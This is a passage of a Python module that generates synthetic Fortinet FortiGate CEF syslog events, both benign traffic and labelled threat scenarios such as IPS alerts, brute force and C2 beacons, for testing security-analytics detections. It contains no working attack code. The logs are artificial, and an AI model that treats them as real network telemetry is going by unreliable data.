# modules/fortinet_fortigate.py
# Simulates Fortinet FortiGate logs in CEF syslog format for XSIAM detection testing.
# XIF: FortiGate_1_3.xif  —  dataset: fortinet_fortigate_raw
#
# FortiOS Log Reference: https://docs.fortinet.com/document/fortigate/7.4.4/fortios-log-message-reference
#
# XDM key field mappings (FortiGate_1_3.xif):
#   src/spt/shost/suser                     → xdm.source.*
#   dst/dpt/dhost/duser                     → xdm.target.*
#   out / in                                → xdm.source/target.sent_bytes
#   FTNTFGTsentpkt / FTNTFGTrcvdpkt        → xdm.source/target.sent_packets
#   FTNTFGTduration                         → xdm.event.duration (×1000 ms)
#   FTNTFGTpolicyname/profile/applist/      → xdm.network.rule (array join)
#     policyid/shaping policyid
#   FTNTFGTattack/virus/vulnname/threattype → xdm.alert.original_threat_name
#   FTNTFGTattackid/virusid/vulnid/cveid   → xdm.alert.original_threat_id
#   FTNTFGTviruscat                         → xdm.alert.category
#   FTNTFGTCRlevel / FTNTFGTseverity        → xdm.alert.severity
#   FTNTFGTref                              → xdm.alert.description
#   FTNTFGTincidentserialno                 → xdm.alert.original_alert_id
#   FTNTFGTlogdesc                          → xdm.alert.subcategory
#   FTNTFGTqname/qtype/qclass              → xdm.network.dns.*
#   FTNTFGThttpmethod / FTNTFGThttpcode    → xdm.network.http.*
#   FTNTFGTreferralurl                      → xdm.network.http.referrer
#   request (+ dhost + dpt)                → xdm.network.http.url / xdm.target.url
#   requestContext / FTNTFGTcatdesc         → xdm.network.http.url_category
#   FTNTFGTforwardedfor                     → xdm.network.http.http_header (X-Forwarded-For)
#   FTNTFGTcipher / FTNTFGTtlsver          → xdm.network.tls.cipher/version
#   FTNTFGTscertcname / FTNTFGTscertissuer → xdm.network.tls.server*
#   FTNTFGTccertissuer                      → xdm.network.tls.client_certificate.issuer
#   FTNTFGTfilehash (len 32=md5, 64=sha256)→ xdm.target.file.md5 / sha256
#   FTNTFGTfiletype / fname / fsize         → xdm.target.file.*
#   FTNTFGTtunnelip / FTNTFGTassignip      → xdm.intermediate.*
#   FTNTFGTtunnelid / FTNTFGTvpntunnel     → xdm.intermediate.host.*
#   FTNTFGTxauthuser / FTNTFGTxauthgroup   → xdm.intermediate.user.*
#   act / FTNTFGTsslaction / FTNTFGTutmaction → xdm.observer.action
#   outcome / FTNTFGTresult                 → xdm.event.outcome
#   reason / FTNTFGTerror / FTNTFGTerror_num → xdm.event.outcome_reason
#   FTNTFGTsubtype                          → xdm.event.type / operation_sub_type
#   FTNTFGTlogid                            → xdm.event.id
#   FTNTFGTosname / FTNTFGTdstosname       → xdm.source/target.host.os
#   FTNTFGTsrccountry/city/srcregion       → xdm.source.location.*
#   FTNTFGTdstcountry/city/dstregion       → xdm.target.location.*
#   FTNTFGTapp + FTNTFGTappid              → xdm.target.application.name
#   FTNTFGTappcat                           → xdm.network.application_protocol_category
#   FTNTFGTapprisk                          → part of xdm.alert.severity
#   FTNTFGTgroup / FTNTFGTadgroup          → xdm.source.user.groups
#   FTNTFGTvd                               → xdm.source.user.domain (VDOM)
#   FTNTFGTfctuid                           → xdm.source.user.identifier
#   FTNTFGTsrcuuid                          → xdm.source.host.device_id
#   FTNTFGTsrcmac / FTNTFGTmastersrcmac    → xdm.source.host.mac_addresses + xdm.source.interface
#   FTNTFGTdstmac / FTNTFGTmasterdstmac    → xdm.target.host.mac_addresses + xdm.target.interface
#   FTNTFGTsrchwvendor / FTNTFGTmanuf      → xdm.source.host.manufacturer
#   FTNTFGTdsthwvendor                      → xdm.target.host.manufacturer
#   dvchost / deviceExternalId              → xdm.observer.name / unique_identifier
#   cefDeviceVersion                        → xdm.observer.version
#   externalId                              → xdm.network.session_id
#   sourceTranslatedAddress                 → included in src IP array
#   FTNTFGTnat / FTNTFGTsaddr              → included in src IP array
#   cat (numeric FortiGuard category ID)    → xdm.observer.type (URL category label)
#   sproc                                   → xdm.source.process.name
#   fname                                   → xdm.source.process.executable.filename
#   requestClientApplication               → xdm.source.user_agent

import random
import time
import uuid
import hashlib
from ipaddress import ip_network, AddressValueError

try:
    from modules.session_utils import get_random_user, find_user_by_ip, rand_ip_from_network
except ImportError:
    from session_utils import get_random_user, find_user_by_ip, rand_ip_from_network

# ---------------------------------------------------------------------------
# Module identity
# ---------------------------------------------------------------------------
NAME        = "Fortinet FortiGate"
DESCRIPTION = "Simulates Fortinet FortiGate traffic, UTM, and event logs in CEF syslog format."
XSIAM_PARSER = "fortinet_fortigate_raw"
CONFIG_KEY   = "fortinet_config"

# Single source of truth for threat event names and their default weights.
# Used as the fallback in _generate_threat_log and by get_threat_names().
# Add new entries here when adding a new dispatch case in _generate_threat_log.
_DEFAULT_THREAT_EVENTS = [
    {"event": "ips",                "weight": 18},
    {"event": "antivirus",          "weight": 15},
    {"event": "webfilter_block",    "weight": 12},
    {"event": "large_upload",       "weight": 8},
    {"event": "port_scan",          "weight": 8},
    {"event": "waf_attack",         "weight": 6},
    {"event": "auth_brute_force",   "weight": 7},
    {"event": "vpn_brute_force",    "weight": 6},
    {"event": "vpn_impossible_travel","weight": 3},
    {"event": "lateral_movement",   "weight": 5},
    {"event": "tor_connection",     "weight": 3},
    {"event": "dns_c2_beacon",      "weight": 3},
    {"event": "server_outbound_http","weight": 2},
    {"event": "rdp_lateral",        "weight": 2},
    {"event": "app_control_block",  "weight": 2},
    {"event": "vpn_tor_login",      "weight": 3},
    {"event": "smb_new_host_lateral","weight": 4},
    {"event": "smb_rare_file_transfer","weight": 3},
    {"event": "smb_share_enumeration","weight": 5},
]


def get_threat_names():
    """Return available threat names dynamically from _DEFAULT_THREAT_EVENTS.
    Adding a new entry to _DEFAULT_THREAT_EVENTS automatically surfaces it here."""
    return [e["event"] for e in _DEFAULT_THREAT_EVENTS]


last_threat_event_time = 0

# ---------------------------------------------------------------------------
# Static data constants
# ---------------------------------------------------------------------------
_FIRST_OCTETS = [45, 52, 54, 62, 80, 91, 104, 142, 176, 185, 193, 194, 212, 213]

# Syslog PRI: facility local6 (22×8=176) + informational (6) = 182
_SYSLOG_PRI = 182

# CEF severity aligned with XIF cef_pri_level mapping
_SEVERITY_MAP = {
    "debug":       "1",
    "information": "2",
    "notice":      "3",
    "warning":     "4",
    "error":       "5",
    "critical":    "6",
    "alert":       "7",
    "emergency":   "8",
}

_BROWSER_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]
_SUSPICIOUS_UA = [
    "curl/7.81.0", "python-requests/2.31.0", "Wget/1.21.4",
    "Go-http-client/1.1", "masscan/1.3", "zgrab/0.x",
]

_TLS_CIPHERS = [
    "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256", "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
]
_TLS_VERSIONS = ["TLSv1.3", "TLSv1.2", "TLSv1.2"]  # weighted toward 1.2

_TLS_ISSUERS = [
    "CN=DigiCert Global CA G2,O=DigiCert Inc,C=US",
    "CN=Let's Encrypt Authority X3,O=Let's Encrypt,C=US",
    "CN=GlobalSign Atlas R3 DV TLS CA 2023 Q3,O=GlobalSign nv-sa,C=BE",
    "CN=Sectigo RSA Domain Validation Secure Server CA,O=Sectigo Limited,L=Salford,C=GB",
]

# Real FortiGate IPS signatures with FortiGuard IDs, CVEs, categories, severity
_IPS_SIGNATURES = [
    {"name": "MS.SMB.Server.EternalBlue.Remote.Code.Execution",     "id": 10001, "cve": "CVE-2017-0144",  "category": "Exploit",          "severity": "critical"},
    {"name": "Apache.Log4j.Error.Log.Remote.Code.Execution",        "id": 49040, "cve": "CVE-2021-44228", "category": "Exploit",          "severity": "critical"},
    {"name": "MS.Exchange.Server.ProxyLogon.Remote.Code.Execution",  "id": 49491, "cve": "CVE-2021-26855", "category": "Exploit",          "severity": "critical"},
    {"name": "OpenSSL.Heartbleed.Information.Disclosure",            "id": 20705, "cve": "CVE-2014-0160",  "category": "Exploit",          "severity": "high"},
    {"name": "Fortinet.SSL.VPN.Credential.Exposure",                 "id": 48457, "cve": "CVE-2018-13379", "category": "Exploit",          "severity": "critical"},
    {"name": "MS.RDP.Remote.Code.Execution.BlueKeep",               "id": 46655, "cve": "CVE-2019-0708",  "category": "Exploit",          "severity": "critical"},
    {"name": "MS.Windows.Print.Spooler.PrintNightmare",             "id": 49879, "cve": "CVE-2021-34527", "category": "Exploit",          "severity": "critical"},
    {"name": "HTTP.URI.SQL.Injection",                               "id": 9103,  "cve": None,             "category": "SQL.Injection",    "severity": "high"},
    {"name": "Web.Application.Cross.Site.Scripting",                "id": 9129,  "cve": None,             "category": "XSS",              "severity": "medium"},
    {"name": "NMAP.SYN.Scan",                                        "id": 35290, "cve": None,             "category": "Reconnaissance",   "severity": "medium"},
    {"name": "PHP.CGI.Argument.Injection",                           "id": 11223, "cve": "CVE-2012-1823",  "category": "Exploit",          "severity": "high"},
    {"name": "Shellshock.Bash.Code.Injection",                       "id": 19217, "cve": "CVE-2014-6271",  "category": "Exploit",          "severity": "critical"},
    {"name": "HTTP.Suspicious.User.Agent.String",                    "id": 32001, "cve": None,             "category": "Suspicious",       "severity": "medium"},
    {"name": "TCP.SYN.Flood",                                        "id": 7000,  "cve": None,             "category": "DoS",              "severity": "high"},
    {"name": "DNS.Zone.Transfer.AXFR.Request",                      "id": 7516,  "cve": None,             "category": "Reconnaissance",   "severity": "medium"},
]

# Real FortiGate app-control blocked applications with FortiGuard app IDs
_APP_CONTROL_BLOCKS = [
    {"app": "BitTorrent",           "appid": 15001, "category": "P2P.File-Sharing", "risk": "high"},
    {"app": "Tor.Network",          "appid": 16390, "category": "Proxy",            "risk": "critical"},
    {"app": "TeamViewer",           "appid": 20306, "category": "Remote.Access",    "risk": "medium"},
    {"app": "Ultrasurf",            "appid": 16388, "category": "Proxy",            "risk": "high"},
    {"app": "CryptoMining.Generic", "appid": 46021, "category": "CryptoMining",     "risk": "high"},
    {"app": "Hola.VPN",             "appid": 48901, "category": "Proxy",            "risk": "high"},
    {"app": "AnyDesk",              "appid": 42030, "category": "Remote.Access",    "risk": "medium"},
    {"app": "Discord",              "appid": 36005, "category": "Collaboration",    "risk": "low"},
    {"app": "Telegram.Desktop",     "appid": 33491, "category": "Collaboration",    "risk": "low"},
    {"app": "Cobalt.Strike.Beacon", "appid": 48500, "category": "Malware.C2",       "risk": "critical"},
]

# FortiGuard URL category numeric IDs for the cat field → used by xdm.observer.type
_URL_CAT_BENIGN  = [30, 31, 34, 36, 37, 39, 41, 42, 46, 47, 49, 52, 81, 82]  # education, finance, health...
_URL_CAT_BLOCKED = [3, 4, 11, 14, 24, 26, 59, 61, 72, 83, 86, 96, 98, 99]   # hacking, malicious, proxy...

# External country/city data for geo enrichment
_EXT_LOCATIONS = [
    {"country": "China",        "city": "Shanghai",   "region": "Shanghai"},
    {"country": "Russia",       "city": "Moscow",     "region": "Moscow"},
    {"country": "United States","city": "Ashburn",    "region": "Virginia"},
    {"country": "Netherlands",  "city": "Amsterdam",  "region": "North Holland"},
    {"country": "Germany",      "city": "Frankfurt",  "region": "Hesse"},
    {"country": "Brazil",       "city": "Sao Paulo",  "region": "Sao Paulo"},
    {"country": "India",        "city": "Mumbai",     "region": "Maharashtra"},
    {"country": "Romania",      "city": "Bucharest",  "region": "Ilfov"},
    {"country": "Ukraine",      "city": "Kyiv",       "region": "Kiev City"},
    {"country": "Singapore",    "city": "Singapore",  "region": "Central Singapore"},
]

_SRC_OS_WINDOWS = ["Windows 10", "Windows 11", "Windows Server 2019", "Windows Server 2022"]
_SRC_OS_SERVER  = ["Linux 5.4 (CentOS 7)", "Linux 5.15 (Ubuntu 22.04)", "Linux 4.18 (RHEL 8)", "Windows Server 2019", "Windows Server 2022"]

# Common benign app/protocol data
_BENIGN_APPS = [
    ("HTTPS.BROWSER", 40568, "Web.Client",    "medium"),
    ("HTTPS",         40568, "Network.Service","low"),
    ("HTTP",          15893, "Network.Service","low"),
    ("Office365",     41025, "Collaboration",  "low"),
    ("Zoom",          43052, "Video/Audio",    "low"),
    ("Teams",         43119, "Collaboration",  "low"),
    ("Slack",         43156, "Collaboration",  "low"),
    ("Dropbox",       18311, "Cloud.Storage",  "medium"),
]


# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def _cef_escape(v):
    """Escapes a CEF extension value per ArcSight CEF spec.
    Backslash must be escaped first, then '=' and newlines."""
    s = str(v)
    s = s.replace("\\", "\\\\")
    s = s.replace("=",  "\\=")
    s = s.replace("\n", "\\n")
    s = s.replace("\r", "\\r")
    return s


def _get_threat_interval(threat_level, config):
    if threat_level == "Benign Traffic Only":
        return 86400 * 365
    return config.get("threat_generation_levels", {}).get(threat_level, 7200)


def _get_config(config):
    return config.get(CONFIG_KEY, {})


def _random_external_ip():
    """Realistic public (non-RFC-1918) IP address."""
    return (f"{random.choice(_FIRST_OCTETS)}."
            f"{random.randint(1, 254)}."
            f"{random.randint(1, 254)}."
            f"{random.randint(1, 254)}")


def _random_mac():
    """Returns a realistic MAC address string."""
    ouis = ["00:50:56", "00:0C:29", "AC:DE:48", "F8:FF:C2", "3C:22:FB", "DC:A6:32"]
    return f"{random.choice(ouis)}:{random.randint(0,255):02X}:{random.randint(0,255):02X}:{random.randint(0,255):02X}"


def _session_id():
    """Random session UUID for externalId field."""
    return str(uuid.uuid4())


def _conn_timing(duration_s=None):
    """Returns (duration_s, _ignored). duration_s suitable for FTNTFGTduration.
    The second return value is unused; FTNTFGTeventtime is set in _format_fortinet_cef."""
    if duration_s is None:
        duration_s = random.randint(5, 300)
    return duration_s, None


def _ext_geo():
    """Random external location for geo-enriched fields on external traffic."""
    return random.choice(_EXT_LOCATIONS)


def _get_user_and_host_info(config, ip_address=None, session_context=None):
    """Returns (username, hostname) from session_context or config fallback."""
    if session_context:
        if ip_address:
            result = find_user_by_ip(session_context, ip_address)
            if result and result[0]:
                return result
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        if user_info:
            return user_info["username"], user_info.get("hostname")
    forti_conf = _get_config(config)
    user_map_rev = {v: k for k, v in (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {})).items()}
    username = user_map_rev.get(ip_address)
    hostname = None
    if username:
        hostname = forti_conf.get("device_map", {}).get(username, {}).get("hostname")
    return username or "unknown", hostname


def _format_fortinet_cef(config, logid, log_type, subtype, log_level, extensions_dict):
    """
    Formats a Fortinet FortiGate CEF syslog message.

    CEF header:  CEF:0|Fortinet|Fortigate|{version}|{logid}|{type}:{subtype}|{severity}|
    Syslog wrap: <PRI>timestamp hostname  CEF:...
    """
    forti_conf  = _get_config(config)
    serial      = forti_conf.get("serial_number", "FGVM08TM21000001")
    vdom        = forti_conf.get("vdom", "root")
    fw_hostname = forti_conf.get("hostname", "FG-FW-01")
    cef_sev     = _SEVERITY_MAP.get(log_level, "3")

    cef_header = (
        f"CEF:0|Fortinet|Fortigate|7.6.4|{logid}"
        f"|{log_type}:{subtype}|{cef_sev}|"
    )

    # Base extensions present on every log
    base = {
        "devid":            serial,
        "deviceExternalId": serial,
        "dvchost":          fw_hostname,
        "FTNTFGTlogid":     logid,
        "FTNTFGTlevel":     log_level,
        "FTNTFGTsubtype":   subtype,
        "FTNTFGTvd":        vdom,
        "FTNTFGTeventtime": int(time.time() * 1_000_000_000),
        "FTNTFGTtz":        "+0000",
    }

    merged = {**base, **extensions_dict}

    ext_string = " ".join(
        f"{k}={_cef_escape(v)}" for k, v in merged.items() if v is not None
    )

    syslog_ts = time.strftime("%b %d %H:%M:%S")
    return f"<{_SYSLOG_PRI}>{syslog_ts} {fw_hostname} {cef_header}{ext_string}"


def _base_traffic_fields(config, src_ip, shost, user, dst_ip, dhost, proto, dpt,
                          act, duration_s=None, src_country="Reserved",
                          dst_country=None, src_os=None):
    """
    Returns the common extension dict used by all traffic and UTM events.
    Covers every XDM-mapped traffic field plus hunt-relevant extras.
    """
    forti_conf    = _get_config(config)
    lan_iface     = forti_conf.get("interface_lan", "port10")
    wan_iface     = forti_conf.get("interface_wan", "port1")
    policy_id     = forti_conf.get("default_policy_id", "1")
    policy_name   = forti_conf.get("default_policy_name", "allow-outbound")
    applist       = forti_conf.get("applist", "g-default")
    profile       = forti_conf.get("utm_profile", "default")
    duration_s, _ = _conn_timing(duration_s)
    sent_bytes    = random.randint(500, 20000)
    rcvd_bytes    = random.randint(10000, 300000)
    src_mac       = _random_mac()
    os_name       = src_os or random.choice(_SRC_OS_WINDOWS)
    app_entry     = random.choice(_BENIGN_APPS)

    return {
        "src":                      src_ip,
        "spt":                      random.randint(49152, 65535),
        "shost":                    shost or src_ip,
        "suser":                    user,
        "dst":                      dst_ip,
        "dpt":                      dpt,
        "dhost":                    dhost or dst_ip,
        "proto":                    str(proto),
        "act":                      act,
        "out":                      sent_bytes,
        "in":                       rcvd_bytes,
        "FTNTFGTsentpkt":           random.randint(5, 100),
        "FTNTFGTrcvdpkt":           random.randint(20, 500),
        "FTNTFGTduration":          duration_s,
        "FTNTFGTsessduration":      duration_s,
        "deviceInboundInterface":   lan_iface,
        "deviceOutboundInterface":  wan_iface,
        "FTNTFGTpolicyid":          policy_id,
        "FTNTFGTpolicyname":        policy_name,
        "FTNTFGTpolicytype":        "policy",
        "FTNTFGTpoluuid":           str(uuid.uuid4()),
        "FTNTFGTprofile":           profile,
        "FTNTFGTapplist":           applist,
        "FTNTFGTapp":               app_entry[0],
        "FTNTFGTappid":             app_entry[1],
        "FTNTFGTappcat":            app_entry[2],
        "FTNTFGTapprisk":           app_entry[3],
        "FTNTFGTsrccountry":        src_country,
        "FTNTFGTdstcountry":        dst_country or "United States",
        "FTNTFGTosname":            os_name,
        "FTNTFGTsrcmac":            src_mac,
        "FTNTFGTmastersrcmac":      src_mac,
        "FTNTFGTsrcintfrole":       "lan",
        "FTNTFGTdstintfrole":       "wan",
        "externalId":               _session_id(),
        "outcome":                  "success" if act in ("accept", "allow", "passthrough") else "failed",
        "msg":                      f"Traffic {act} by policy {policy_name}",
    }


# ---------------------------------------------------------------------------
# Benign event generators
# ---------------------------------------------------------------------------

def _generate_traffic_forward(config, src_ip, user, shost):
    """Normal outbound web browsing — traffic:forward allow."""
    destinations = config.get("benign_egress_destinations") or [{}]
    dest         = random.choice(destinations)
    dst_ip       = rand_ip_from_network(ip_network(dest.get("ip_range", "40.96.0.0/13"), strict=False))
    domain       = random.choice(config.get("benign_domains", ["microsoft.com", "google.com"]))
    geo          = _ext_geo()
    app_entry    = random.choice(_BENIGN_APPS)
    duration_s   = random.randint(10, 600)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        duration_s=duration_s, dst_country=dest.get("country", geo["country"])
    )
    fields.update({
        "app":              "HTTPS",
        "FTNTFGTapp":       app_entry[0],
        "FTNTFGTappid":     app_entry[1],
        "FTNTFGTappcat":    app_entry[2],
        "FTNTFGTapprisk":   app_entry[3],
        "request":          f"/{domain}/",
        "FTNTFGThttpmethod":"GET",
        "FTNTFGThttpcode":  random.choice([200, 200, 200, 301, 304]),
        "FTNTFGTreferralurl": f"https://{domain}/",
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTcipher":    random.choice(_TLS_CIPHERS),
        "FTNTFGTtlsver":    random.choice(_TLS_VERSIONS),
        "FTNTFGTscertcname": f"*.{domain}",
        "FTNTFGTscertissuer": random.choice(_TLS_ISSUERS),
        "FTNTFGTdstcity":   geo["city"],
        "FTNTFGTdstregion": geo["region"],
        "msg":              f"HTTPS session to {domain}",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_inbound_block(config):
    """External probe denied at perimeter — traffic:forward deny."""
    forti_conf   = _get_config(config)
    ext_ip       = _random_external_ip()
    geo          = _ext_geo()
    target_ip    = random.choice(config.get("internal_servers", ["10.0.10.50"]))
    scan_port    = random.choice([22, 23, 80, 443, 445, 1433, 3306, 3389, 8080, 8443])
    wan_iface    = forti_conf.get("interface_wan", "port1")
    lan_iface    = forti_conf.get("interface_lan", "port10")

    fields = {
        "src":                      ext_ip,
        "spt":                      random.randint(1024, 65535),
        "dst":                      target_ip,
        "dpt":                      scan_port,
        "proto":                    "6",
        "act":                      "deny",
        "deviceInboundInterface":   wan_iface,
        "deviceOutboundInterface":  lan_iface,
        "FTNTFGTpolicyid":          "0",
        "FTNTFGTpolicyname":        "implicit-deny",
        "FTNTFGTpolicytype":        "policy",
        "FTNTFGTsrccountry":        geo["country"],
        "FTNTFGTsrccity":           geo["city"],
        "FTNTFGTsrcregion":         geo["region"],
        "FTNTFGTdstcountry":        "Reserved",
        "FTNTFGTduration":          0,
        "out":                      0,
        "in":                       0,
        "FTNTFGTsentpkt":           1,
        "FTNTFGTrcvdpkt":           0,
        "externalId":               _session_id(),
        "outcome":                  "failed",
        "reason":                   "no-policy-match",
        "msg":                      f"Denied by implicit policy from {geo['country']}",
    }
    return _format_fortinet_cef(config, "0000000014", "traffic", "forward", "notice", fields)


def _generate_webfilter_allow(config, src_ip, user, shost):
    """Outbound web request inspected and allowed — utm:webfilter ftgd_allow."""
    destinations = config.get("benign_egress_destinations") or [{}]
    dest         = random.choice(destinations)
    dst_ip       = rand_ip_from_network(ip_network(dest.get("ip_range", "40.96.0.0/13"), strict=False))
    domain       = random.choice(config.get("benign_domains", ["microsoft.com"]))
    cat_id       = random.choice(_URL_CAT_BENIGN)
    geo          = _ext_geo()

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept",
        dst_country=dest.get("country", geo["country"])
    )
    fields.update({
        "app":              "HTTPS",
        "request":          f"https://{domain}/",
        "hostname":         domain,
        "FTNTFGTeventtype": "ftgd_allow",
        "cat":              str(cat_id),
        "FTNTFGTcatdesc":   "General Interest",
        "requestContext":   "General Interest",
        "FTNTFGThttpmethod":"GET",
        "FTNTFGThttpcode":  200,
        "requestClientApplication": random.choice(_BROWSER_UA),
        "FTNTFGTprofile":   _get_config(config).get("webfilter_profile", "default-webfilter"),
        "msg":              f"URL allowed by webfilter: {domain}",
        "outcome":          "success",
    })
    return _format_fortinet_cef(config, "0201009218", "utm", "webfilter", "notice", fields)


def _generate_dns_query(config, src_ip, user, shost):
    """Outbound DNS query — utm:dns dns-query."""
    domain    = random.choice(config.get("benign_domains", ["microsoft.com", "google.com"]))
    resolver  = random.choice(["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222"])
    resolved  = f"{random.randint(13,185)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    qtype     = random.choices(["A", "AAAA", "MX", "TXT"], weights=[70, 15, 10, 5])[0]

    fields = {
        "src":              src_ip,
        "spt":              random.randint(49152, 65535),
        "shost":            shost or src_ip,
        "suser":            user,
        "dst":              resolver,
        "dpt":              53,
        "dhost":            "dns.google" if resolver.startswith("8.8") else resolver,
        "proto":            "17",
        "act":              "passthrough",
        "app":              "DNS",
        "FTNTFGTeventtype": "dns-query",
        "FTNTFGTqname":     domain,
        "FTNTFGTqtype":     qtype,
        "FTNTFGTqclass":    "IN",
        "FTNTFGTipaddr":    resolved,
        "FTNTFGTpolicyid":  "1",
        "FTNTFGTpolicyname": _get_config(config).get("default_policy_name", "allow-outbound"),
        "FTNTFGTprofile":   _get_config(config).get("dns_filter_profile", "default-dns-filter"),
        "FTNTFGTduration":  0,
        "out":              random.randint(50, 100),
        "in":               random.randint(50, 200),
        "FTNTFGTsentpkt":   1,
        "FTNTFGTrcvdpkt":   1,
        "FTNTFGTsrccountry":"Reserved",
        "FTNTFGTdstcountry":"United States",
        "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":    _random_mac(),
        "externalId":       _session_id(),
        "outcome":          "success",
        "msg":              f"DNS query for {domain} type {qtype}",
    }
    return _format_fortinet_cef(config, "1501054802", "utm", "dns", "information", fields)


def _generate_admin_event(config):
    """Admin login success or failure — event:system."""
    forti_conf   = _get_config(config)
    admin_users  = forti_conf.get("admin_users", ["admin"])
    user         = random.choice(admin_users)
    mgmt_ip      = forti_conf.get("management_ip", "172.16.200.1")
    # Admin logins originate from operator workstations, not servers
    umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
    src_ip = random.choice(list(umap.values())) if umap else "172.16.200.50"
    is_success   = random.random() > 0.15

    if is_success:
        fields = {
            "FTNTFGTlogdesc":  "Admin login successful",
            "duser":           user,
            "src":             src_ip,
            "dst":             mgmt_ip,
            "act":             "login",
            "outcome":         "success",
            "FTNTFGTmethod":   "https",
            "FTNTFGTduration": 0,
            "sproc":           f"https({src_ip})",
            "msg":             f"Administrator {user} login successful from https({src_ip})",
        }
        return _format_fortinet_cef(config, "0100032001", "event", "system", "notice", fields)
    else:
        fields = {
            "FTNTFGTlogdesc":  "Admin login failed",
            "duser":           user,
            "src":             src_ip,
            "dst":             mgmt_ip,
            "act":             "login",
            "outcome":         "failed",
            "reason":          "name_invalid",
            "FTNTFGTmethod":   "https",
            "FTNTFGTduration": 0,
            "sproc":           f"https({src_ip})",
            "msg":             f"Administrator {user} login failed from https({src_ip}) because of invalid user name",
        }
        return _format_fortinet_cef(config, "0100032002", "event", "system", "alert", fields)


def _generate_vpn_event(config, session_context=None):
    """SSL VPN tunnel up/down — event:vpn."""
    forti_conf   = _get_config(config)
    src_ip_ranges = config.get("benign_ingress_sources") or [{}]
    src_range     = random.choice(src_ip_ranges)
    ext_ip        = rand_ip_from_network(ip_network(src_range.get("ip_range", "68.0.0.0/11"), strict=False))
    geo           = _ext_geo()
    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user = user_info["username"] if user_info else random.choice(["jsmith", "bjones", "mwilliams"])
    else:
        user = random.choice(["jsmith", "bjones", "mwilliams", "rthomas"])

    tunnel_ip     = f"10.212.134.{random.randint(100, 200)}"
    tunnel_id     = random.randint(100000, 999999)
    gw_ip         = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    is_up         = random.random() > 0.1

    fields = {
        "src":                  ext_ip,
        "dst":                  gw_ip,
        "dpt":                  443,
        "proto":                "6",
        "suser":                user,
        "FTNTFGTxauthuser":     user,
        "FTNTFGTxauthgroup":    "VPN_Users",
        "FTNTFGTtunnelid":      tunnel_id,
        "FTNTFGTtunneltype":    "ssl-vpn",
        "FTNTFGTtunnelip":      tunnel_ip,
        "FTNTFGTassignip":      tunnel_ip,
        "FTNTFGTremotegw":      ext_ip,
        "FTNTFGTvpntunnel":     "SSL-VPN-Tunnel",
        "FTNTFGTsrccountry":    geo["country"],
        "FTNTFGTsrccity":       geo["city"],
        "FTNTFGTsrcregion":     geo["region"],
        "FTNTFGTduration":      0,
        "externalId":           _session_id(),
    }

    if is_up:
        fields.update({
            "act":     "tunnel-up",
            "outcome": "success",
            "msg":     f"SSL VPN tunnel established for user {user}",
        })
        return _format_fortinet_cef(config, "0101039426", "event", "vpn", "notice", fields)
    else:
        fields.update({
            "act":     "tunnel-down",
            "outcome": "failed",
            "reason":  "sslvpn_login_permission_denied",
            "msg":     f"SSL VPN login failed for user {user}",
        })
        return _format_fortinet_cef(config, "0101039428", "event", "vpn", "warning", fields)


def _generate_ntp_sync(config, src_ip, user, shost):
    """NTP time synchronisation — UDP/123 to a public NTP server (traffic:forward).

    Short duration, tiny byte counts.  Represents routine clock sync from workstations,
    servers, and network appliances.  Logged by FortiGate as a standard traffic forward event.
    """
    ntp_servers = ["216.239.35.0", "129.6.15.28", "132.163.96.1",
                   "17.253.52.125", "162.159.200.1", "198.60.22.240"]
    ntp_dest = random.choice(ntp_servers)

    fields = _base_traffic_fields(
        config, src_ip, shost, user, ntp_dest, "pool.ntp.org", "17", 123, "accept",
        duration_s=random.randint(0, 1)
    )
    fields.update({
        "app":             "NTP",
        "FTNTFGTapp":      "NTP",
        "FTNTFGTappid":    "16195",
        "FTNTFGTappcat":   "Network.Service",
        "FTNTFGTapprisk":  "low",
        "out":             random.randint(48, 76),
        "in":              random.randint(48, 76),
        "msg":             f"NTP sync from {src_ip} to {ntp_dest}:123",
    })
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _generate_antivirus_allow(config, src_ip, user, shost):
    """FortiAV scan: clean file passed through — utm:antivirus virustype=clean.

    Represents the normal background of AV inspection events where files are
    inspected and found clean.  File downloads, email attachments, and web content
    all pass through FortiAV; the vast majority result in a clean verdict.
    """
    destinations = config.get("benign_egress_destinations") or [{}]
    dest         = random.choice(destinations)
    dst_ip       = rand_ip_from_network(ip_network(dest.get("ip_range", "40.96.0.0/13"), strict=False))
    domain       = dest.get("name", "microsoft.com").lower().replace(" ", "")

    file_extensions = ["exe", "dll", "zip", "docx", "xlsx", "pdf", "msi", "cab"]
    file_ext   = random.choice(file_extensions)
    file_size  = random.randint(10_000, 50_000_000)
    profile    = _get_config(config).get("av_profile", "default")

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, domain, "6", 443, "accept"
    )
    fields.update({
        "app":                  "HTTPS",
        "FTNTFGTeventtype":     "viruscleaned",
        "FTNTFGTvirusname":     "Clean",
        "FTNTFGTvirusstatus":   "Pass",
